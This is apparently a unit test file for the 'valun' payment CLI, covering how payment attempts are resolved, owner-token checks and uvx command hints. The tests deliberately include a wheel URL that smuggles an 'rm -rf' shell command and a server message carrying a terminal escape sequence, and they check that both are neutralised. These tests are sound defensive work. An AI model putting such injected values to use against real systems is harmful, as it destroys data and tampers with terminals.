        # valun-app SV-AUTH-1: 409 payee_edge_not_applied {payee_edge} to --applied. The CLI says why and names the two
        # ways on (the exact --not-applied command, or the operator); it offers no resolution in the records only.
        self.with_attempt()
        route = f'POST /pilot/v1/owner/deals/{self.deal}/attempts/vt_0123456789abcdef/resolve'
        self.world.fail[route] = [vc.ValunError('payee_edge_not_applied', "the payee's edge does not show it\x1b[2J", 409,
                                                {'payee_edge': 'moved_past'})]
        before = self.disk()['transfer_attempts']
        rc, out = self.run_cli('attempts', 'resolve', self.deal, '#1', '--applied', '--owner-token-file', self.token_file,
                               tty=True, answers=['y'])               # one confirmation; no second question follows
        self.assertEqual(rc, 1, out)
        self.assertIn("The server records it as applied only if the payee's edge on the tracker shows this transfer", out)
        self.assertIn('The server did not record this payment as applied (payee_edge_not_applied, payee edge: '
                      'moved_past). Nothing was changed', out)
        self.assertIn("moved past the transfer's timestamp at its earlier total", out)
        # The attempt is quoted: pasted into bash, zsh or PowerShell, an unquoted '#1 --not-applied' is a comment.
        self.assertIn(f'`valun --profile s attempts resolve {self.deal} "#1" --not-applied`', out)
        self.assertNotIn(' #1 --not-applied', out)
        self.assertIn('ask the operator to look into it with the payee', out)
        self.assertNotIn('INCONSISTENT', out)
        self.assertNotIn("client's records only?", out)
        self.assertNotIn('\x1b', out)
        disk = self.disk()                                            # nothing resolved, nothing recorded as paid
        self.assertEqual((self.world.resolutions, disk['transfer_attempts']), ([], before))
        self.assertNotIn('paid_deals', disk.get('records') or {})

    def test_an_inconsistent_attempt_is_the_operators_case(self):
        # Post-audit (PA-OPEN verifier): for a transfer the server reads as inconsistent (one edge applied, the other
        # not), resolving it as not applied on the payee's word could pay the deal twice. The plan says so before the
        # question, and the payee_edge_not_applied refusal names no --not-applied command for it.
        self.with_attempt(server_state='inconsistent')
        route = f'POST /pilot/v1/owner/deals/{self.deal}/attempts/vt_0123456789abcdef/resolve'
        self.world.fail[route] = [vc.ValunError('payee_edge_not_applied', "the payee's edge does not show it", 409,
                                                {'payee_edge': 'moved_past'})]
        before = self.disk()['transfer_attempts']
        rc, out = self.run_cli('attempts', 'resolve', self.deal, '#1', '--applied', '--owner-token-file', self.token_file,
                               tty=True, answers=['y'])
        self.assertEqual(rc, 1, out)
        self.assertIn('The server reads this transfer as INCONSISTENT', out)
        self.assertLess(out.index('INCONSISTENT'), out.index('<- this one'))      # in the plan, before the question
        self.assertIn('Do not resolve it until the operator has looked into it.', out)
        self.assertNotIn('--not-applied`', out)                                   # no command to pay it again
        disk = self.disk()
        self.assertEqual((self.world.resolutions, disk['transfer_attempts']), ([], before))

    def test_the_plan_warns_about_an_inconsistent_attempt_and_says_nothing_for_others(self):
        self.with_attempt(server_state='inconsistent')
        rc, out = self.run_cli('attempts', 'resolve', self.deal, '#1', '--not-applied', '--owner-token-file',
                               self.token_file, tty=True, answers=['n'])
        self.assertEqual(rc, 3, out)
        self.assertIn("That is the operator's case", out)
        self.assertIn('Nothing was changed.', out)

    def test_a_transfer_whose_id_was_never_recorded_is_resolved_by_the_id_the_owner_gives(self):
        # The POST of my payment got no answer: the server recorded the transfer (its outcome unknown), my client never
        # learnt its id. The owner gives the id; GET /transfers identifies my attempt; FX-SV's answer is taken.
        self.keyed_profile()
        w = self.world
        w.wrong_left = 0
        w.set_edge(X_ID, S_ID, 3, now_ms() - 60_000)
        did = w.delivered_deal(payer=S_ID, payee=M_ID, service='notary', text='hello')
        w.pay_unknown = w.lose_pay_answer = True
        with self.assertRaises(vc.ValunError) as e:
            self.client().pay_by_transfer(did, X_ID)
        self.assertEqual(e.exception.code, 'unreachable')
        w.pay_unknown = w.lose_pay_answer = False
        (tid,) = list(w.transfers)
        self.assertNotIn('attempt_id', self.disk()['transfer_attempts'][did][0])
        rc, out = self.run_cli('attempts', 'resolve', did, '#1', '--not-applied', '--owner-token-file', self.token_file,
                               tty=True, answers=['y', 'n'])
        self.assertEqual(rc, 3, out)
        self.assertIn("Your client did not record the server's id of this transfer", out)
        rc, out = self.run_cli('attempts', 'resolve', did, tid, '--not-applied', '--owner-token-file', self.token_file,
                               tty=True, answers=['y'])
        self.assertEqual(rc, 0, out)
        self.assertIn('<- this one', out)
        self.assertEqual(w.resolutions, [(did, tid, {'outcome': 'not_applied'}, 'vpo_test-only')])
        rec = self.disk()['transfer_attempts'][did][0]
        self.assertEqual((rec['outcome'], rec['attempt_id']), ('not_applied', tid))
        self.assertIn("Your client's records now hold it for 1 attempt(s)", out)

    # ----- FX2-PY -----
    def asking(self, then=None):
        """An input() for the owner that answers 'y', after then(), and records how many requests were made by then."""
        self.asked = []

        def answer(prompt):
            if then is not None:
                then()
            self.asked.append((prompt, len(self.world.log)))
            return 'y'
        return answer

    def test_an_empty_owner_token_changes_nothing_and_sends_nothing(self):
        # An empty --owner-token-file, or an empty answer at the hidden prompt: rc 1, said so, and no request after the
        # confirmation (nothing is resolved at the server nor in the records).
        self.with_attempt()
        empty = os.path.join(self.home.name, 'empty.txt')
        with open(empty, 'w', encoding='utf-8') as f:
            f.write('  \n')
        for how in ('file', 'prompt'):
            extra = ['--owner-token-file', empty] if how == 'file' else []
            with mock.patch('builtins.input', side_effect=self.asking()), \
                    mock.patch.object(cli.getpass, 'getpass', return_value='  ') as prompt:
                rc, out = self.run_cli('attempts', 'resolve', self.deal, '#1', '--not-applied', *extra, tty=True)
            self.assertEqual(rc, 1, how)
            self.assertIn('No owner token given; nothing was changed.', out, how)
            self.assertEqual(prompt.call_count, 0 if how == 'file' else 1, how)
            self.assertEqual([n for _p, n in self.asked], [len(self.world.log)], how)   # nothing after the confirmation
        self.assertEqual(self.world.resolutions, [])
        self.assertNotIn('outcome', self.disk()['transfer_attempts'][self.deal][0])

    def test_an_agent_token_given_as_the_owner_token_gets_no_local_choice(self):
        # FX-SV answers 404 not_found to an agent token on the owner routes, as for an attempt it does not hold: the
        # client checks the token with GET /owner first, so the owner is told not_owner and is not offered to record a
        # decision in the records only.
        self.with_attempt()
        wrong = os.path.join(self.home.name, 'agent.txt')
        with open(wrong, 'w', encoding='utf-8') as f:
            f.write(AGENT_TOKEN + '\n')                          # the World's throwaway agent token, not an owner's
        with mock.patch('builtins.input', side_effect=self.asking()):
            rc, out = self.run_cli('attempts', 'resolve', self.deal, '#1', '--not-applied', '--owner-token-file', wrong,
                                   tty=True)
        self.assertEqual(rc, 1, out)
        self.assertEqual(json.loads(out.strip().splitlines()[-1])['error'], 'not_owner')
        self.assertEqual(len(self.asked), 1)                      # only "Resolve it?": no question about local records
        self.assertNotIn('The server did not resolve it', out)
        self.assertNotIn("Recording it in your client's records only", out)
        self.assertEqual(self.world.requests()[-2:], [f'POST /pilot/v1/owner/deals/{self.deal}/attempts/vt_0123456789abcdef'
                                                      '/resolve', 'GET /pilot/v1/owner'])
        self.assertEqual(self.world.resolutions, [])
        self.assertNotIn('outcome', self.disk()['transfer_attempts'][self.deal][0])

    def test_the_attempt_resolved_is_the_one_shown_or_nothing_changes(self):
        # The plan for '#1' is shown and confirmed; meanwhile another process changes the deal's attempts (it prunes the
        # first one, here), so '#1' would now name another attempt: resolve_attempt gets the confirmed attempt's key and
        # refuses (attempt_changed); nothing is sent or changed.
        self.with_attempt()
        disk = self.disk()
        first = disk['transfer_attempts'][self.deal][0]
        second = dict(first, timestamp=first['timestamp'] + 1000, attempt_id='vt_1123456789abcdef')
        disk['transfer_attempts'][self.deal].append(second)
        self.write(disk)
        self.world.add_transfer('vt_1123456789abcdef', self.deal, 'outcome_unknown', second['timestamp'],
                                (self.edge, {'total': 3, 'timestamp': self.T - 50_000, 'signature': '00'}, 1),
                                (self.world.edge(X_ID, M_ID), None, 2), 2)

        def prune_first():
            d = self.disk()
            d['transfer_attempts'][self.deal].pop(0)
            self.write(d)
        args = ('attempts', 'resolve', self.deal, '#1', '--not-applied', '--owner-token-file', self.token_file)
        with mock.patch('builtins.input', side_effect=self.asking(prune_first)):
            rc, out = self.run_cli(*args, tty=True)
        self.assertEqual(rc, 1, out)
        shown = {x.split(' server id ')[1].split(':')[0]: x.endswith('   <- this one')
                 for x in out.splitlines() if ' server id ' in x}
        self.assertEqual(shown, {'vt_0123456789abcdef': True, 'vt_1123456789abcdef': False})   # what the owner confirmed
        self.assertEqual(json.loads(out.strip().splitlines()[-1])['error'], 'attempt_changed')
        self.assertEqual(self.world.resolutions, [])                           # the other one was not resolved
        self.assertEqual(self.world.requests()[self.asked[-1][1]:],            # after the confirmation: the plan, read again
                         ['GET /pilot/v1/info', 'GET /pilot/v1/transfers/vt_1123456789abcdef'])
        self.assertEqual([r.get('outcome') for r in self.disk()['transfer_attempts'][self.deal]], [None])
        # shown again and confirmed, the attempt now named #1 is resolved
        with mock.patch('builtins.input', side_effect=self.asking()):
            rc, out = self.run_cli(*args, tty=True)
        self.assertEqual(rc, 0, out)
        self.assertEqual(self.world.resolutions, [(self.deal, 'vt_1123456789abcdef', {'outcome': 'not_applied'},
                                                   'vpo_test-only')])

    def test_after_a_409_the_local_choice_is_for_the_attempt_shown_too(self):
        # The server ended the transfer before the POST (409): the owner is asked whether to record the decision in the
        # records only, and while that question waits, another process prunes the first attempt. The second call
        # carries the confirmed key too: nothing is recorded for the attempt now named #1.
        self.with_attempt()
        disk = self.disk()
        second = dict(disk['transfer_attempts'][self.deal][0], timestamp=self.T + 1000, attempt_id='vt_1123456789abcdef')
        disk['transfer_attempts'][self.deal].append(second)
        self.write(disk)
        self.world.fail[f'POST /pilot/v1/owner/deals/{self.deal}/attempts/vt_0123456789abcdef/resolve'] = [
            vc.ValunError('wrong_state', 'this payment attempt is failed', 409)]
        answers = iter(['y', 'y'])

        def answer(prompt):
            if prompt.startswith('Record your decision'):
                d = self.disk()
                d['transfer_attempts'][self.deal].pop(0)
                self.write(d)
            return next(answers)
        with mock.patch('builtins.input', side_effect=answer):
            rc, out = self.run_cli('attempts', 'resolve', self.deal, '#1', '--not-applied', '--owner-token-file',
                                   self.token_file, tty=True)
        self.assertEqual(rc, 1, out)
        self.assertIn('The server did not resolve it (wrong_state)', out)
        self.assertEqual(json.loads(out.strip().splitlines()[-1])['error'], 'attempt_changed')
        self.assertEqual([r.get('outcome') for r in self.disk()['transfer_attempts'][self.deal]], [None])
        self.assertEqual(self.world.resolutions, [])

    def test_a_paid_deal_lists_an_attempt_it_cannot_prove_dead_with_nothing_to_resolve(self):
        # INT-1: a transfer that was rejected (or cancelled) acknowledged the same prior state as the retry that paid the
        # deal. My records cannot prove the first dead (D-2 a: a raise of an incoming edge needs no signature of mine),
        # but the deal is paid by the second: the list says so, and gives no advice to resolve anything.
        self.world.welcome = False
        self.join()
        disk, edge = self.disk(), self.world.edge(X_ID, S_ID)
        t0 = now_ms() - 3 * 3_600_000
        T1 = t0 + 600_000 - (t0 + 600_000) % 1000 + 999
        paid, unpaid = 'vd_' + 'a' * 16, 'vd_' + 'b' * 16
        first = {'deal_id': paid, 'route': 'transfer', 'edge': edge, 'prior': 3, 'prior_timestamp': t0,
                 'prior_signature': None, 'total': 1, 'timestamp': T1, 'quote_digest': None, 'signed_at': None,
                 'attempt_id': 'vt_' + 'a' * 16}
        disk['transfer_attempts'] = {paid: [first, dict(first, timestamp=T1 + 60_000, attempt_id='vt_' + 'b' * 16)]}
        disk.setdefault('records', {})['paid_deals'] = {paid: {'route': 'transfer', 'edge': edge, 'total': 1,
                                                               'timestamp': T1 + 60_000}}
        self.write(disk)
        self.world.set_edge(X_ID, S_ID, 1, T1 + 60_000)            # the retry applied: my claim 3 -> 1 PC
        rc, out = self.run_cli('attempts', 'list')
        self.assertEqual(rc, 0, out)
        lines = out.splitlines()
        self.assertIn(f'deal {paid}: recorded as paid', lines)
        (one,) = [x for x in lines if x.startswith('  #1 ')]
        (two,) = [x for x in lines if x.startswith('  #2 ')]
        self.assertTrue(one.endswith(": cannot be proven dead from your client's records, but the deal is paid by #2: "
                                     'nothing to resolve'), one)
        self.assertTrue(two.endswith(': applied: the deal is paid by it'), two)
        self.assertNotIn('MAY HAVE APPLIED', out)
        self.assertNotIn('attempts resolve', out)                  # no advice to resolve anything (in any form)
        # resolving it anyway: the owner is told that the deal is paid whatever is decided
        rc, out = self.run_cli('attempts', 'resolve', paid, '#1', '--not-applied', '--owner-token-file', self.token_file,
                               tty=True, answers=['n'])
        self.assertEqual(rc, 3, out)
        self.assertIn('  This deal is recorded as paid by #2: your client never pays it again, whatever you decide here.',
                      out)
        # an unknown attempt of a deal that is not paid still needs the owner, and the advice is given
        disk = self.disk()
        disk['transfer_attempts'][unpaid] = [dict(first, deal_id=unpaid, total=2, timestamp=T1 + 1000, attempt_id=None)]
        self.write(disk)
        rc, out = self.run_cli('attempts', 'list')
        self.assertEqual(rc, 0, out)
        self.assertIn('your claim 3 -> 2 PC', [x for x in out.splitlines() if 'MAY HAVE APPLIED' in x][0])
        self.assertIn('`valun --profile s attempts resolve DEAL ATTEMPT --applied`', out)    # FX3-PY: names the profile
        # double quotes, which cmd reads as PowerShell and bash do (the RC's review, R2-OTHER-4: cmd passed '#1' with its
        # single quotes, which the client refuses as no attempt). The list shows each attempt bare (#1), so the advice
        # says to write it in double quotes, not that the list prints them so (the RC's review, round 3, R3-REG-3)
        self.assertTrue(any(x.startswith('  #1 ') for x in out.splitlines()), out)
        self.assertIn('ATTEMPT is the #n this list shows, written in double quotes ("#1": unquoted, a # starts a comment in '
                      'bash and PowerShell, and cmd keeps single quotes as part of it)', out)
        self.assertNotIn('as this list prints it', out)
        self.assertNotIn("'#n'", out)
        if os.name == 'nt':
            import subprocess
            echo = 'import sys,json;print(json.dumps(sys.argv[1:]))'
            r = subprocess.run(f'"{sys.executable}" -c "{echo}" "#1" ' + "'#1'", shell=True, capture_output=True, text=True,
                               timeout=60)
            got = json.loads(r.stdout)
            self.assertEqual([bool(vc._ATTEMPT_REF_RE.fullmatch(a)) for a in got], [True, False], got)

    def test_a_paid_deal_paid_by_a_payment_the_list_does_not_show_has_nothing_to_resolve(self):
        # FX3-PY (FX2-PY verifier, item 8): records.paid_deals names a payment that no row of the list shows (paid_by
        # None). The attempt that cannot be proven dead still has nothing to resolve: the deal is recorded as paid.
        self.world.welcome = False
        self.join()
        disk, edge = self.disk(), self.world.edge(X_ID, S_ID)
        t0 = now_ms() - 3 * 3_600_000
        T1 = t0 + 600_000 - (t0 + 600_000) % 1000 + 999
        paid = 'vd_' + 'a' * 16
        first = {'deal_id': paid, 'route': 'transfer', 'edge': edge, 'prior': 3, 'prior_timestamp': t0,
                 'prior_signature': None, 'total': 1, 'timestamp': T1, 'quote_digest': None, 'signed_at': None,
                 'attempt_id': 'vt_' + 'a' * 16}
        disk['transfer_attempts'] = {paid: [first, dict(first, timestamp=T1 + 60_000, attempt_id='vt_' + 'b' * 16)]}
        disk.setdefault('records', {})['paid_deals'] = {paid: {'route': 'transfer', 'edge': edge, 'total': 1,
                                                               'timestamp': T1 + 120_000}}       # matches no row
        self.write(disk)
        self.world.set_edge(X_ID, S_ID, 1, T1 + 60_000)
        c = self.client()
        read = c.sync_edges()                                      # as `valun attempts list` reads them
        rows = c.payment_attempts(edges=read['edges'], doubtful=read['doubtful'])
        self.assertEqual([(r['ref'], r['state'], r['paid'], r['paid_by']) for r in rows],
                         [('#1', 'unknown', True, None), ('#2', 'applied', True, None)])
        rc, out = self.run_cli('attempts', 'list')
        self.assertEqual(rc, 0, out)
        lines = out.splitlines()
        self.assertIn(f'deal {paid}: recorded as paid', lines)
        (one,) = [x for x in lines if x.startswith('  #1 ')]
        self.assertTrue(one.endswith(": cannot be proven dead from your client's records, but the deal is recorded as "
                                     'paid: nothing to resolve'), one)
        self.assertNotIn('MAY HAVE APPLIED', out)
        self.assertNotIn('attempts resolve', out)                  # no advice to resolve anything

    def test_a_local_only_plan_resolves_only_the_attempt_shown(self):
        # FX3-PY (FX2-PY verifier, item 3): the first plan changes only the client's records (a credit note: plan local
        # 'note'). While 'Resolve it?' waits, another process drops the first of the deal's two bound-note attempts, so
        # that #1 now names the other one: resolve_attempt refuses (attempt_changed) before anything is sent or recorded.
        S = self.keyed_profile()
        w = self.world
        did = w.delivered_deal(payer=S_ID, payee=M_ID, service='notary', text='hello')
        mk = w.pk(M_ID)
        t0 = now_ms() - 3 * 3_600_000
        ts = t0 + 600_000 - (t0 + 600_000) % 1000 + 997
        w.set_edge(S_ID, M_ID, 2, t0, signature=sign_note(S, mk, 2, t0))
        note = {'deal_id': did, 'route': 'note', 'edge': w.edge(S_ID, M_ID), 'prior': 2, 'prior_timestamp': t0,
                'prior_signature': sign_note(S, mk, 2, t0), 'total': 4, 'timestamp': ts, 'quote_digest': None,
                'signed_at': None}
        disk = self.disk()
        disk['transfer_attempts'] = {did: [note, dict(note, timestamp=ts + 1000)]}
        self.write(disk)
        w.set_edge(S_ID, M_ID, 1, ts + 2001, kind='setoff', ref='vs_0123456789abcdef', signature=sign_note(S, mk, 1, ts + 2001))

        def drop_first():
            d = self.disk()
            d['transfer_attempts'][did].pop(0)
            self.write(d)
        with mock.patch('builtins.input', side_effect=self.asking(drop_first)):
            rc, out = self.run_cli('attempts', 'resolve', did, '#1', '--not-applied', '--owner-token-file', self.token_file,
                                   tty=True)
        self.assertEqual(rc, 1, out)
        self.assertIn('The server holds no payment attempt for a credit note', out)     # the local-only plan was shown
        self.assertEqual([p for p, _n in self.asked], ['Resolve it? [y/N] '])           # one confirmation, as for a note
        self.assertEqual(json.loads(out.strip().splitlines()[-1])['error'], 'attempt_changed')
        self.assertNotIn('GET /pilot/v1/owner', w.requests()[self.asked[-1][1]:])      # no owner check after it
        self.assertEqual(w.resolutions, [])
        self.assertEqual([r.get('outcome') for r in self.disk()['transfer_attempts'][did]], [None])
        self.assertNotIn('paid_deals', self.disk().get('records') or {})


class EarnAndBuy(Cli):
    def test_earn_does_the_welcome_job(self):
        self.join()
        rc, out = self.run_cli('sandbox', 'earn')
        self.assertEqual(rc, 0, out)
        r = json.loads(out.strip().splitlines()[-1])
        self.assertEqual((r['status'], r['paid'], r['amount']), ('note_issued', True, 3))
        self.assertEqual(self.world.total(X_ID, S_ID), 3)

    def test_earn_sells_text_stats_when_no_job_waits(self):
        self.world.welcome = False
        self.join()
        rc, out = self.run_cli('sandbox', 'earn')
        self.assertEqual(rc, 0, out)
        self.assertEqual(json.loads(out.strip().splitlines()[-1])['status'], 'note_issued')
        d = next(iter(self.world.deals.values()))
        self.assertEqual((d['payer'], d['payee'], d['current']['terms']['service']['title']), (X_ID, S_ID, 'text-stats job'))
        self.assertEqual(self.world.total(X_ID, S_ID), 3)

    def test_buy_pays_with_a_note_held(self):
        self.world.welcome = False
        self.world.wrong_left = 0
        self.join()
        self.world.set_edge(X_ID, S_ID, 3, now_ms() - 60_000)
        rc, out = self.run_cli('sandbox', 'buy', 'sandbox-mallory', 'notary', '--text', 'hello', '--pay-with', 'sandbox-exact')
        self.assertEqual(rc, 0, out)
        r = json.loads(out.strip().splitlines()[-1])
        self.assertEqual((r['status'], r['verified'], r['paid_with']), ('paid_by_transfer', True, 'sandbox-exact'))
        self.assertEqual((self.world.total(X_ID, S_ID), self.world.total(X_ID, M_ID)), (1, 2))

    def test_the_seller_processes_consents_at_most_once_a_minute(self):
        self.join()
        self.world.welcome = False
        log = io.StringIO()
        seller = sb.Seller(vc.FileStore(os.path.join(self.home.name, 'profiles', 's.json')), server=SERVER, log=log)
        seller.step()
        seller.step()
        self.assertEqual(self.world.requests().count('GET /pilot/v1/consents'), 1)


class NextHintsUnderUvx(Cli):
    """Fix inbox #88 (2): run as `uvx --from valun==X valun join ...` (skill.md's way), the commands join and the other
    next-step hints print are the ones a later shell can run, where no `valun` is on the PATH: `uvx --from valun==X valun
    --profile s doctor`. uvx is told by its environment (sys.prefix in an archive-v<N> folder of uv's cache). Where uv
    started the command some other way (UV set: `uv run`, say) the hint names `valun` and then the uvx form; run as
    `valun` (no uv), every hint is as before (the tests above)."""
    UVX = f'uvx --from valun=={__version__} valun'
    PREFIXES = ('/home/ann/.cache/uv/archive-v0/RC88w8KPTszFcwZc', 'C:\\Users\\Ann\\AppData\\Local\\uv\\cache\\archive-v0\\RC88w8KPTszFcwZc',
                '/Users/ann/.cache/uv/archive-v12/x1')
    VENV = '/home/ann/project/.venv'

    def run_under(self, prefix, fn, uv='/home/ann/.local/bin/uv'):
        """fn() with sys.prefix `prefix`, and UV set to `uv` (None: unset)."""
        with mock.patch.object(sys, 'prefix', prefix), mock.patch.dict(os.environ):
            os.environ.pop('UV', None)
            if uv:
                os.environ['UV'] = uv
            return fn()

    def test_uvx_is_told_by_its_environment_and_nothing_else_is_taken_for_it(self):
        for prefix in self.PREFIXES:
            self.assertTrue(self.run_under(prefix, cli._run_by_uvx), prefix)
            self.assertTrue(self.run_under(prefix, cli._run_by_uvx, uv=None), 'the environment alone tells it')
            self.assertEqual(self.run_under(prefix, cli._valun), self.UVX)
            self.assertEqual(self.run_under(prefix, cli._with_uvx), '', 'the uvx form itself: nothing to add')
        for prefix in ('/home/ann/.local/share/uv/tools/valun', self.VENV, 'C:\\Python314', '/home/ann/.cache/uv/builds-v0/.tmpbxqWuf',
                       '/tmp/my-cache/archive-v0/abc'):
            self.assertFalse(self.run_under(prefix, cli._run_by_uvx), prefix)
            self.assertEqual(self.run_under(prefix, cli._valun, uv=None), 'valun')
        self.assertEqual(self.run_under(self.VENV, cli._with_uvx), f' (with uvx: `{self.UVX} ...`)')
        self.assertEqual(self.run_under(self.VENV, cli._with_uvx, uv=None), '')

    def test_join_run_by_uvx_names_the_uvx_command_in_every_hint(self):
        out = self.run_under(self.PREFIXES[0], self.join)
        u = self.UVX
        self.assertIn(f'Next: run `{u} --profile s doctor`, then, for your agent, one of:\n'
                      f'  - In an MCP app: add `{u} --profile s mcp` to it (see `{u} mcp --help`).\n', out)
        self.assertIn(f'change it with `{u} --profile s config consents.<role> on|off`', out)
        self.assertIn(f'and signs them in the background while `{u} --profile s mcp` (consent_loop on) or `{u} --profile s '
                      'clearing watch` runs.', out)
        self.assertEqual(re.findall(r'`valun ([^`]+)`', out), [], 'no command names a bare valun')
        cmds = re.findall(r'`(uvx --from valun==[^ ]+ valun [^`]+)`', out)
        self.assertTrue(cmds and all(c.startswith(f'{u} --profile s ') or c == f'{u} mcp --help' for c in cmds), cmds)
        argv = shlex.split(re.search(r'Next: run `([^`]+)`', out).group(1))
        self.assertEqual(argv[:4], ['uvx', '--from', f'valun=={__version__}', 'valun'])
        rc, out = self.main(argv[4:])                     # what it names runs: doctor of this profile
        self.assertIn('Agent accepted by the server as stranger', out)

    def test_join_started_by_uv_some_other_way_adds_the_uvx_form(self):
        out = self.run_under(self.VENV, self.join)
        self.assertIn(f'Next: run `valun --profile s doctor` (with uvx: `{self.UVX} ...`), then, for your agent, one of:\n',
                      out)

    # The first-tester readiness assessment of 2026-11-18 (blocker 7): join told every agent to add `valun mcp`, whose
    # consent loop signs the set-offs and payments to it; a shell agent never runs it, and its set-off waited until
    # `valun clearing run`. The Nov 18 fresh-join run (finding 3): join's Next block has two equal branches, the MCP
    # app's and the shell agent's, in the pinned uvx form.
    SHELL = ('  - From a shell: run `{v} --profile s call valun_inbox` regularly, which shows what waits for your agent, and '
             'signs the set-offs and payments to you by transfer that your policy allows; or keep `{v} --profile s clearing '
             'watch` running, which signs all your policy allows{uvx}.\n')

    def test_join_run_by_uvx_tells_a_shell_agent_what_signs_its_consents(self):
        out = self.run_under(self.PREFIXES[0], self.join)
        self.assertIn(self.SHELL.format(v=self.UVX, uvx=''), out)
        self.assertLess(out.index('  - In an MCP app: '), out.index('  - From a shell: '))
        self.assertTrue(out.endswith(self.SHELL.format(v=self.UVX, uvx='')), 'the last lines of join')
        argv = shlex.split(re.search(r'run `([^`]+call valun_inbox)`', out).group(1))
        self.assertEqual(argv[:4], ['uvx', '--from', f'valun=={__version__}', 'valun'])
        rc, out = self.main(argv[4:])                     # what it names runs: valun_inbox of this profile
        self.assertEqual(rc, 0, out)
        self.assertIn('respond', json.loads(out))

    def test_join_run_as_valun_names_the_shell_commands_and_their_pinned_uvx_form(self):
        out = self.run_under(self.VENV, self.join, uv=None)
        self.assertIn(self.SHELL.format(v='valun', uvx=f' (with uvx: `{self.UVX} ...`)'), out)

    def test_the_other_next_step_hints_run_by_uvx(self):
        u = self.UVX
        rc, out = self.run_under(self.PREFIXES[1], lambda: self.run_cli('doctor', '--server', SERVER))     # not joined
        self.assertIn(f'FIX   Not connected: run `{u} --profile s join --sandbox --handle YOUR-HANDLE --operator "YOUR NAME" '
                      f'--server {SERVER}` (no invite: sandbox only), '
                      f'`{u} --profile s join --server {SERVER}` (with an invite) or `{u} --profile s enroll --server {SERVER}` '
                      '(with an enrollment code).', out)                  # the uvx form itself: nothing follows
        rc, out = self.run_under(self.PREFIXES[1], lambda: self.run_cli('sandbox', 'earn'))
        self.assertIn(f"Profile 's' is not joined yet; run `{u} --profile s join` first.", out)
        rc, out = self.run_under(self.VENV, lambda: self.run_cli('doctor', '--server', SERVER))
        self.assertIn(f'`valun --profile s enroll --server {SERVER}` (with an enrollment code) (with uvx: `{u} ...`).', out)
        # join stopped at enrolment: what it says to finish names the uvx command too
        self.world.fail['POST /pilot/v1/enroll'] = [vc.ValunError('rate_limited', 'too many requests; slow down', 429)]
        rc, out = self.run_under(self.PREFIXES[0], lambda: self.run_cli('join', '--sandbox', '--handle', 'stranger', '--operator', 'Ann',
                                                                        '--server', SERVER, '--owner-token-file', self.token_file))
        self.assertEqual(rc, 1, out)
        self.assertIn(f'then run `{u} --profile s enroll --server {SERVER} --participant {S_ID}`.', out)

    def test_the_hints_an_agent_meets_next_name_the_uvx_command_too(self):
        """The 0.7.2 review: join with approvals ask (skill.md's), `valun call` of a commitment where nobody can approve
        it, the consent loop's and policy hints, and the MCP server's approval_unavailable name the uvx command, with
        this profile, where uvx runs this one."""
        u = self.UVX
        rc, out = self.run_under(self.PREFIXES[0], lambda: self.run_cli(
            'join', '--handle', 'stranger', '--operator', 'Ann', '--approvals', 'ask', '--server', SERVER, '--owner-token-file',
            self.token_file, '--sandbox'))
        self.assertEqual(rc, 0, out)
        self.assertIn(f'in this terminal for `{u} call`', out)
        self.assertEqual(re.findall(r'`valun ([^`]+)`', out), [], 'no command names a bare valun')
        rc, out = self.run_under(self.PREFIXES[0], lambda: self.run_cli('call', 'valun_propose', json.dumps({
            'counterparty': 'sandbox-exact', 'role': 'payer', 'title': 't', 'description': 'd', 'deliverable': 'x', 'price': 1})))
        self.assertEqual(json.loads(out)['error'], 'approval_unavailable', out)
        self.assertIn(f'`{u} --profile s config approvals console --owner-token-file FILE`', json.loads(out)['message'])
        for argv in (('policy', 'show'), ('config', 'consent_loop', 'on')):
            rc, out = self.run_under(self.PREFIXES[0], lambda argv=argv: self.run_cli(*argv))
            self.assertEqual(re.findall(r'`valun ([^`]+)`', out), [], (argv, out))
            self.assertIn(f'`{u} --profile s ', out, argv)
        from valun import mcp_server
        self.assertIn(f'`{u} --profile s config approvals console --owner-token-file FILE`',
                      mcp_server.McpServer(None, 'ask', command=f'{u} --profile s').approval_unavailable['what_this_means'])
        self.assertIn('`valun config approvals console --owner-token-file FILE`',
                      mcp_server.APPROVAL_UNAVAILABLE['what_this_means'], 'as before, by default')

    def test_the_uvx_command_runs_the_source_this_valun_came_from(self):
        """The 0.7.2 review: a valun that uvx installed from a URL (a release candidate's wheel, a git checkout: its
        direct_url.json, PEP 610) is named by that URL, not by a version on PyPI that is another valun, or none."""
        class Dist:
            def __init__(self, text):
                self.text = text

            def read_text(self, name):
                return self.text if name == 'direct_url.json' else None
        cases = [(None, f'valun=={__version__}'),
                 (json.dumps({'url': 'file:///C:/Users/Ann%20Smith/valun-0.7.2-py3-none-any.whl', 'archive_info': {}}),
                  'file:///C:/Users/Ann%20Smith/valun-0.7.2-py3-none-any.whl'),
                 (json.dumps({'url': 'https://github.com/fitzss/valun-open.git', 'vcs_info': {'vcs': 'git', 'commit_id': 'ab' * 20},
                              'subdirectory': 'python'}), f"git+https://github.com/fitzss/valun-open.git@{'ab' * 20}#subdirectory=python"),
                 (json.dumps({'url': 'https://hg.example/valun', 'vcs_info': {'vcs': 'hg', 'commit_id': '1'}}), f'valun=={__version__}'),
                 (json.dumps({'url': 'file:///tmp/a b`rm -rf`.whl'}), f'valun=={__version__}'),
                 ('not json', f'valun=={__version__}')]
        for text, want in cases:
            with mock.patch('importlib.metadata.distribution', lambda _name, text=text: Dist(text)):
                self.assertEqual(cli._uvx_from(), want, text)
                self.assertEqual(self.run_under(self.PREFIXES[0], cli._valun), f'uvx --from {want} valun', text)
        with mock.patch('importlib.metadata.distribution', side_effect=Exception('no metadata')):
            self.assertEqual(cli._uvx_from(), f'valun=={__version__}')

    def test_no_invite_code_names_this_profile_and_server(self):
        rc, out = self.run_under(self.PREFIXES[0], lambda: self.run_cli(
            'join', '--handle', 'stranger', '--operator', 'Ann', '--approvals', 'none', '--server', SERVER, '--owner-token-file',
            self.token_file, '--invite-from-stdin', stdin='invite-code\n'))
        self.assertNotIn('No invite code?', out, '--invite-from-stdin: an invite is given')
        out, err = io.StringIO(), io.StringIO()
        # at a terminal, whatever stdin the tests run with (without one, join prints the command to run instead: the RC's
        # review found this test failing with stdin a pipe)
        with mock.patch.object(sys, 'prefix', self.PREFIXES[0]), contextlib.redirect_stdout(out), contextlib.redirect_stderr(err), \
                mock.patch('getpass.getpass', side_effect=KeyboardInterrupt), mock.patch.object(cli, '_at_terminal', lambda: True):
            rc = cli.main(['--profile', 'work', 'join', '--server', SERVER])     # Ctrl+C at the invite prompt, as it says
        self.assertIn(f'run `{self.UVX} --profile work join --sandbox --server {SERVER}`.', out.getvalue())
